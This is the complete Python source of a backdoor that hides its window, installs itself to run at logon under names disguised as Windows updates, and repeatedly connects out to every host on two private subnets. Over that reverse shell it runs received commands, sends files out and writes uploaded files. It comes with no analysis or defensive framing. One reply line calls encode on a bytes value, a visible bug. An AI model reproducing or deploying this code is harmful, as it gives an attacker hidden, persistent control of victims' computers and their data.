import socket
import subprocess
import os
import sys
import time
import platform
import base64
import threading

def set_persistence():
    if platform.system() == "Windows":
        try:
            import winreg
            exe_path = sys.executable + " " + os.path.abspath(__file__)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except:
            pass
        try:
            startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
            with open(os.path.join(startup, "SystemUpdate.bat"), 'w') as f:
                f.write(f'start "" "{sys.executable}" "{os.path.abspath(__file__)}"')
        except:
            pass
        try:
            subprocess.run(['schtasks', '/create', '/tn', 'SystemUpdate', '/tr', f'"{sys.executable}" "{os.path.abspath(__file__)}"', '/sc', 'onlogon', '/f'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def execute_cmd(cmd):
    try:
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            if path == "":
                path = os.path.expanduser("~")
            try:
                os.chdir(path)
                return f"[+] Changed directory to {os.getcwd()}"
            except Exception as e:
                return f"[-] Cannot change directory: {str(e)}"
        else:
            if platform.system() == "Windows":
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd())
                stdout_value = proc.stdout.read() + proc.stderr.read()
                if len(stdout_value) == 0:
                    return "[+] Command executed (no output)"
                try:
                    return stdout_value.decode('cp850')
                except:
                    return stdout_value.decode('utf-8', errors='ignore')
            else:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd())
                stdout_value = proc.stdout.read() + proc.stderr.read()
                if len(stdout_value) == 0:
                    return "[+] Command executed (no output)"
                return stdout_value.decode()
    except Exception as e:
        return f"[-] Error: {str(e)}"

def daemonize():
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    else:
        try:
            if os.fork() != 0:
                sys.exit(0)
            os.setsid()
            if os.fork() != 0:
                sys.exit(0)
            sys.stdin.close()
            sys.stdout.close()
            sys.stderr.close()
        except:
            pass

def connect(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(10)
            s.connect((host, port))
            s.settimeout(None)
            while True:
                data = s.recv(4096)
                if not data:
                    break
                cmd = data.decode()
                if cmd == "exit":
                    s.close()
                    sys.exit(0)
                elif cmd == "echo keepalive":
                    s.send(b"alive")
                elif cmd.startswith("download "):
                    filename = cmd[9:]
                    try:
                        with open(filename, "rb") as f:
                            file_data = base64.b64encode(f.read()).decode()
                        s.send(file_data.encode())
                    except:
                        s.send(b"FILE_NOT_FOUND")
                elif cmd.startswith("upload "):
                    parts = cmd[7:].split("|", 1)
                    remote_path = parts[0]
                    file_data = base64.b64decode(parts[1])
                    try:
                        os.makedirs(os.path.dirname(remote_path), exist_ok=True)
                    except:
                        pass
                    with open(remote_path, "wb") as f:
                        f.write(file_data)
                    s.send(f"[+] Uploaded to {remote_path}".encode())
                elif cmd == "persist":
                    set_persistence()
                    s.send(b"[+] Persistence reapplied".encode())
                elif cmd == "pwd":
                    s.send(os.getcwd().encode())
                else:
                    result = execute_cmd(cmd)
                    s.send(result.encode())
            s.close()
        except:
            time.sleep(5)

def connect_all():
    for i in range(1, 255):
        ip1 = f"192.168.1.{i}"
        t1 = threading.Thread(target=connect, args=(ip1, 8883))
        t1.daemon = True
        t1.start()
        ip2 = f"192.168.100.{i}"
        t2 = threading.Thread(target=connect, args=(ip2, 8883))
        t2.daemon = True
        t2.start()
        time.sleep(0.05)

if __name__ == "__main__":
    daemonize()
    set_persistence()
    connect_all()
    while True:
        time.sleep(60)
